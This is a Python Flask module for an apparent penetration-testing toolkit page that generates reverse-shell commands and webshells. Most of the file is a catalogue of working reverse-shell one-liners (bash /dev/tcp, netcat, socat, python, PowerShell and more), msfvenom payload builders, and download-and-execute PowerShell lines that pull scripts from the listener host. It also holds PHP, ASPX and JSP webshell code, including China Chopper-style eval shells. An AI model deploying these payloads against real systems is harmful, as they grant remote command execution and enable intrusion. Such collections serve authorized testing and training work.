from flask import Blueprint, render_template

bp = Blueprint("revshells", __name__)

# {h} = $LHOST, {p} = $LPORT (literal string replace, so braces in payloads are
# fine). os: any of linux / mac / windows. Ordered to mirror revshells.com.
SHELLS = [
    # --- bash / sh ---
    {"name": "Bash -i",            "os": ["linux", "mac"], "cmd": r"""bash -i >& /dev/tcp/{h}/{p} 0>&1 """},
    {"name": "Bash 196",           "os": ["linux"],        "cmd": r"""0<&196;exec 196<>/dev/tcp/{h}/{p}; sh <&196 >&196 2>&196 """},
    {"name": "Bash read line",     "os": ["linux", "mac"], "cmd": r"""exec 5<>/dev/tcp/{h}/{p};cat <&5 | while read line; do $line 2>&5 >&5; done """},
    {"name": "Bash 5",             "os": ["linux", "mac"], "cmd": r"""bash -i 5<> /dev/tcp/{h}/{p} 0<&5 1>&5 2>&5 """},
    {"name": "Bash -l",            "os": ["linux", "mac"], "cmd": r"""/bin/bash -l > /dev/tcp/{h}/{p} 0<&1 2>&1 """},
    {"name": "Bash UDP",           "os": ["linux", "mac"], "cmd": r"""sh -i >& /dev/udp/{h}/{p} 0>&1     # listener: nc -u -lvp {p} """},
    {"name": "sh -i",              "os": ["linux", "mac"], "cmd": r"""sh -i >& /dev/tcp/{h}/{p} 0>&1 """},
    # --- netcat family ---
    {"name": "nc mkfifo",          "os": ["linux", "mac"], "cmd": r"""rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {h} {p} >/tmp/f """},
    {"name": "nc -e",              "os": ["linux"],        "cmd": r"""nc {h} {p} -e /bin/sh """},
    {"name": "nc -c",              "os": ["linux"],        "cmd": r"""nc {h} {p} -c sh """},
    {"name": "nc udp mkfifo",      "os": ["linux"],        "cmd": r"""rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u {h} {p} >/tmp/f """},
    {"name": "nc.exe -e",          "os": ["windows"],      "cmd": r"""nc.exe {h} {p} -e cmd.exe """},
    {"name": "ncat -e",            "os": ["linux", "mac"], "cmd": r"""ncat {h} {p} -e /bin/bash """},
    {"name": "ncat udp",           "os": ["linux", "mac"], "cmd": r"""ncat -u {h} {p} -e /bin/bash """},
    {"name": "ncat ssl",           "os": ["linux", "mac"], "cmd": r"""ncat --ssl {h} {p} -e /bin/bash """},
    {"name": "rustcat",            "os": ["linux", "mac"], "cmd": r"""rcat connect -s bash {h} {p} """},
    # --- socat ---
    {"name": "socat",              "os": ["linux", "mac"], "cmd": r"""socat TCP:{h}:{p} EXEC:/bin/sh """},
    {"name": "socat tty",          "os": ["linux", "mac"], "cmd": r"""socat TCP:{h}:{p} EXEC:'bash -li',pty,stderr,setsid,sigint,sane """},
    {"name": "socat (windows)",    "os": ["windows"],      "cmd": r"""socat TCP:{h}:{p} EXEC:'cmd.exe',pipes """},
    # --- interpreters ---
    {"name": "perl",               "os": ["linux", "mac"], "cmd": r"""perl -e 'use Socket;$i="{h}";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """},
    {"name": "perl no sh",         "os": ["windows"],      "cmd": r"""perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{h}:{p}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' """},
    {"name": "python",             "os": ["linux", "mac"], "cmd": r"""python -c 'import socket,os,pty;s=socket.socket();s.connect(("{h}",{p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")' """},
    {"name": "python3",            "os": ["linux", "mac"], "cmd": r"""python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{h}",{p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")' """},
    {"name": "python3 short",      "os": ["linux", "mac"], "cmd": r"""export RHOST="{h}";export RPORT={p};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' """},
    {"name": "python3 (windows)",  "os": ["windows"],      "cmd": r"""python3 -c "import socket,subprocess,threading;s=socket.socket();s.connect(('{h}',{p}));p=subprocess.Popen('cmd.exe',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True);threading.Thread(target=lambda:[s.send(o) for o in iter(lambda:p.stdout.read(1),b'')]).start();[p.stdin.write(s.recv(1024)) or p.stdin.flush() for _ in iter(int,1)]" """},
    {"name": "php",                "os": ["linux", "mac"], "cmd": r"""php -r '$sock=fsockopen("{h}",{p});exec("/bin/sh -i <&3 >&3 2>&3");' """},
    {"name": "php exec",           "os": ["linux", "mac"], "cmd": r"""php -r '$sock=fsockopen("{h}",{p});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);' """},
    {"name": "php system",         "os": ["linux", "mac"], "cmd": r"""php -r '$sock=fsockopen("{h}",{p});system("/bin/sh -i <&3 >&3 2>&3");' """},
    {"name": "php shell_exec",     "os": ["linux", "mac"], "cmd": r"""php -r '$sock=fsockopen("{h}",{p});shell_exec("/bin/sh -i <&3 >&3 2>&3");' """},
    {"name": "php passthru",       "os": ["linux", "mac"], "cmd": r"""php -r '$sock=fsockopen("{h}",{p});passthru("/bin/sh -i <&3 >&3 2>&3");' """},
    {"name": "ruby",               "os": ["linux", "mac"], "cmd": r"""ruby -rsocket -e'f=TCPSocket.open("{h}",{p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' """},
    {"name": "ruby (windows)",     "os": ["windows"],      "cmd": r"""ruby -rsocket -e 'c=TCPSocket.new("{h}","{p}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' """},
    {"name": "awk",                "os": ["linux", "mac"], "cmd": r"""awk 'BEGIN {s = "/inet/tcp/0/{h}/{p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null """},
    {"name": "lua",                "os": ["linux", "mac"], "cmd": r"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{h}','{p}');os.execute('/bin/sh -i <&3 >&3 2>&3');" """},
    {"name": "lua 5.1",            "os": ["linux", "mac"], "cmd": r"""lua5.1 -e 'local host,port="{h}",{p} local socket=require("socket") local tcp=socket.tcp() local io=require("io") tcp:connect(host,port); while true do local cmd=tcp:receive() local f=io.popen(cmd,"r") local s=f:read("*a") f:close() tcp:send(s) end' """},
    {"name": "golang",             "os": ["linux", "mac"], "cmd": r"""echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{h}:{p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go """},
    {"name": "node.js",            "os": ["linux", "mac", "windows"], "cmd": r"""node -e 'sh=require("child_process").exec("/bin/bash");var c=new require("net").Socket();c.connect({p},"{h}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});' """},
    {"name": "telnet",             "os": ["linux", "mac"], "cmd": r"""TF=$(mktemp -u);mkfifo $TF && telnet {h} {p} 0<$TF | /bin/sh 1>$TF """},
    {"name": "zsh",                "os": ["linux", "mac"], "cmd": r"""zsh -c 'zmodload zsh/net/tcp && ztcp {h} {p} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' """},
    {"name": "OpenSSL",            "os": ["linux", "mac"], "cmd": r"""mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {h}:{p} > /tmp/s; rm /tmp/s     # listener: openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 1 -nodes; openssl s_server -quiet -key k.pem -cert c.pem -port {p} """},
    {"name": "xterm (X11)",        "os": ["linux"],        "cmd": r"""xterm -display {h}:1     # attacker: Xnest :1 ; xhost +targetip """},
    # --- compiled ---
    {"name": "C",                  "os": ["linux"],        "cmd": r"""printf '#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nint main(){int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in a;a.sin_family=AF_INET;a.sin_port=htons({p});a.sin_addr.s_addr=inet_addr("{h}");connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execve("/bin/sh",0,0);}\n' > /tmp/r.c && gcc /tmp/r.c -o /tmp/r && /tmp/r """},
    {"name": "Dart",               "os": ["linux", "mac", "windows"], "cmd": r"""import 'dart:io';import 'dart:convert';main(){Socket.connect("{h}",{p}).then((socket){socket.listen((data){Process.start('/bin/sh',[]).then((Process process){process.stdin.writeln(new String.fromCharCodes(data).trim());process.stdout.transform(utf8.decoder).listen((output){socket.write(output);});});});});} """},
    {"name": "Java",               "os": ["linux", "mac"], "cmd": r"""public class shell{public static void main(String[] a)throws Exception{Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/{h}/{p};cat <&5 | while read line; do $line 2>&5 >&5; done"}).waitFor();}} """},
    {"name": "Groovy",             "os": ["linux", "mac"], "cmd": r"""String host="{h}";int port={p};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close(); """},
    {"name": "Crystal (system)",   "os": ["linux", "mac"], "cmd": r"""crystal eval 'require "process";require "socket";c=TCPSocket.new("{h}",{p});loop do m=c.gets; break if !m; o=IO::Memory.new; Process.run(m.chomp,shell:true,output:o,error:o); c.print o.to_s end' """},
    {"name": "V (vlang)",          "os": ["linux", "mac"], "cmd": r"""echo 'import os' > /tmp/r.v && echo 'fn main(){os.system("/bin/sh -i >& /dev/tcp/{h}/{p} 0>&1")}' >> /tmp/r.v && v run /tmp/r.v """},
    # --- windows / powershell ---
    {"name": "PowerShell #1",      "os": ["windows"],      "cmd": r"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{h}',{p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" """},
    {"name": "PowerShell #2",      "os": ["windows"],      "cmd": r"""powershell -nop -W hidden -noni -ep bypass -c "$c = New-Object Net.Sockets.TCPClient('{h}', {p});$s = $c.GetStream();$r = New-Object IO.StreamReader($s);$w = New-Object IO.StreamWriter($s);$w.AutoFlush = $true;$b = New-Object System.Byte[] 1024;while ($c.Connected) {while ($s.DataAvailable) {$n = $s.Read($b, 0, $b.Length);$code = ([text.encoding]::UTF8).GetString($b, 0, $n - 1)};if ($c.Connected -and $code.Length -gt 1) {$out = try {Invoke-Expression $code 2>&1} catch {$_};$w.Write($out + 'PS> ')}};$c.Close()" """},
    {"name": "PowerShell #3 (base64)", "os": ["windows"],  "cmd": r"""$client = New-Object System.Net.Sockets.TCPClient('{h}',{p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()     # switch Encoding to base64 above -> powershell -nop -enc <blob> """},
    {"name": "powercat",           "os": ["windows"],      "cmd": r"""powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://{h}/powercat.ps1');powercat -c {h} -p {p} -e cmd" """},
    {"name": "ConPtyShell",        "os": ["windows"],      "cmd": r"""IEX(IWR http://{h}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell {h} {p}     # attacker: stty raw -echo; (stty size; cat) | nc -lvnp {p} """},
    # --- msfvenom stagers ---
    {"name": "msfvenom win exe (stageless)", "os": ["windows"], "cmd": r"""msfvenom -p windows/x64/shell_reverse_tcp LHOST={h} LPORT={p} -f exe -o shell.exe """},
    {"name": "msfvenom win meterpreter",     "os": ["windows"], "cmd": r"""msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={h} LPORT={p} -f exe -o met.exe """},
    {"name": "msfvenom linux elf (stageless)","os": ["linux"],  "cmd": r"""msfvenom -p linux/x64/shell_reverse_tcp LHOST={h} LPORT={p} -f elf -o shell.elf """},
    {"name": "msfvenom linux meterpreter",   "os": ["linux"],   "cmd": r"""msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={h} LPORT={p} -f elf -o met.elf """},
    {"name": "msfvenom war (tomcat)",        "os": ["linux", "windows"], "cmd": r"""msfvenom -p java/jsp_shell_reverse_tcp LHOST={h} LPORT={p} -f war -o shell.war """},
    {"name": "msfvenom jsp",                 "os": ["linux", "windows"], "cmd": r"""msfvenom -p java/jsp_shell_reverse_tcp LHOST={h} LPORT={p} -f raw -o shell.jsp """},
    {"name": "msfvenom php",                 "os": ["linux"],   "cmd": r"""msfvenom -p php/reverse_php LHOST={h} LPORT={p} -f raw -o shell.php """},
]


import html as _html


# --- Webshells: file-based shells you drop on a target (not h/p one-liners) ---
# block kinds: {"code": "..."} raw copy (no $VAR subst), {"cmd": "..."} live subst,
#              {"link": url, "name":, "note":}, {"text": "..."}
WEBSHELLS = [
    {"title": "PHP", "hint": "Drop a .php on the target, then browse to it. Start minimal; escalate to a full shell if allowed.", "blocks": [
        {"code": "<?php system($_GET['cmd']); ?>", "lbl": "minimal — visit ?cmd=id"},
        {"code": "<?php echo shell_exec($_GET['c']); ?>", "lbl": "shell_exec variant (?c=...)"},
        {"code": "<?php passthru($_REQUEST['cmd']); ?>", "lbl": "GET or POST, raw output"},
        {"code": "<?php @eval($_POST['x']); ?>", "lbl": "China Chopper style — POST field 'x'"},
        {"cmd": "weevely generate <password> shell.php", "lbl": "stealth encrypted agent — build"},
        {"cmd": "weevely http://$RHOST/shell.php <password>", "lbl": "weevely — connect"},
        {"link": "https://github.com/pentestmonkey/php-reverse-shell", "name": "pentestmonkey/php-reverse-shell",
         "note": "classic full reverse shell — set the IP/port at the top before upload"},
        {"link": "https://github.com/flozz/p0wny-shell", "name": "flozz/p0wny-shell",
         "note": "single-file PHP shell with a proper terminal UI, cd, upload/download"},
        {"link": "https://github.com/Arrexel/phpbash", "name": "Arrexel/phpbash",
         "note": "single-file, semi-interactive, POST-based (HTB favourite)"},
    ]},
    {"title": "ASP / ASPX", "hint": "For IIS / .NET targets. Antak and Laudanum give full-featured shells.", "blocks": [
        {"code": "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"pass\"],\"unsafe\");%>", "lbl": "China Chopper aspx (client: Behinder/caidao)"},
        {"link": "https://github.com/samratashok/nishang", "name": "Antak (Nishang)",
         "note": "PowerShell-based ASPX shell — Nishang/Antak-WebShell/antak.aspx; upload, run, download"},
        {"link": "https://github.com/antonioCoco/SharPyShell", "name": "antonioCoco/SharPyShell",
         "note": "tiny obfuscated ASP.NET (C#) shell with an encrypted channel"},
        {"text": "Laudanum ships an asp/aspx shell too — /usr/share/laudanum/ on Kali. Edit the allowed-IP line before you deploy it."},
    ]},
    {"title": "JSP", "hint": "For Tomcat / Java app servers. Pair with the msfvenom .war/.jsp payloads in the grid above.", "blocks": [
        {"code": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "lbl": "blind exec (?cmd=...)"},
        {"code": "<%@ page import=\"java.util.*,java.io.*\"%><% if(request.getParameter(\"cmd\")!=null){Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader d=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=d.readLine())!=null){out.println(l);}} %>", "lbl": "prints command output"},
    ]},
    {"title": "Tunneling webshells", "hint": "Turn a webshell into a SOCKS proxy to reach the internal network over HTTP.", "blocks": [
        {"link": "https://github.com/L-codes/Neo-reGeorg", "name": "L-codes/Neo-reGeorg",
         "note": "modern, encrypted reGeorg rewrite (php/aspx/jsp tunnels)"},
        {"cmd": "neoreg.py generate -k <key>", "lbl": "build the tunnel files"},
        {"cmd": "neoreg.py -k <key> -u http://$RHOST/tunnel.php", "lbl": "start local SOCKS proxy"},
        {"link": "https://github.com/sensepost/reGeorg", "name": "sensepost/reGeorg",
         "note": "the original HTTP SOCKS tunneler"},
    ]},
    {"title": "Collections & toolkits", "blocks": [
        {"link": "https://github.com/danielmiessler/SecLists/tree/master/Web-Shells", "name": "SecLists / Web-Shells",
         "note": "bundled webshells incl. Laudanum, FuzzDB set, c99/r57 — offline-friendly"},
        {"link": "https://github.com/WhiteWinterWolf/wwwolf-php-webshell", "name": "wwwolf-php-webshell",
         "note": "self-contained PHP shell that works under tight configs"},
        {"link": "https://github.com/b374k/b374k", "name": "b374k/b374k",
         "note": "feature-rich PHP manager (file browser, DB, network tools)"},
        {"link": "https://github.com/codingo/web-shells", "name": "codingo/web-shells",
         "note": "small, no-auth shells for lab/exam use (php/aspx/mysql)"},
    ]},
]


def _ws_esc(s):
    return _html.escape("" if s is None else str(s))


def _ws_block(b):
    if "code" in b:
        lbl = '<span class="lbl">%s</span>' % _ws_esc(b["lbl"]) if b.get("lbl") else ""
        return ('<div class="cmd plain wscode" data-raw="%s">%s<code>%s</code></div>'
                % (_ws_esc(b["code"]), lbl, _ws_esc(b["code"])))
    if "cmd" in b:
        lbl = '<span class="lbl">%s</span>' % _ws_esc(b["lbl"]) if b.get("lbl") else ""
        return '<div class="cmd" data-tpl="%s">%s</div>' % (_ws_esc(b["cmd"]), lbl)
    if "link" in b:
        note = ' <span class="osint-note">%s</span>' % _ws_esc(b["note"]) if b.get("note") else ""
        return ('<div class="osint-item"><a class="osint-link" href="%s" target="_blank" '
                'rel="noopener">%s <span class="ext">&#8599;</span></a>%s</div>'
                % (_ws_esc(b["link"]), _ws_esc(b.get("name") or b["link"]), note))
    if "text" in b:
        return '<p class="osint-tech">%s</p>' % _ws_esc(b["text"])
    return ""


def render_webshells():
    out = ""
    for card in WEBSHELLS:
        hint = '<p class="hint">%s</p>' % _ws_esc(card["hint"]) if card.get("hint") else ""
        body = "".join(_ws_block(b) for b in card["blocks"])
        out += '<div class="card"><h3>%s</h3>%s%s</div>' % (_ws_esc(card["title"]), hint, body)
    return out


@bp.route("/revshells")
def index():
    return render_template("revshells.html", active="revshells", shells=SHELLS,
                           webshells=render_webshells())


MODULE = {"id": "revshells", "title": "Reverse shells", "category": "Access",
          "order": 0, "blueprint": bp, "endpoint": "revshells.index"}
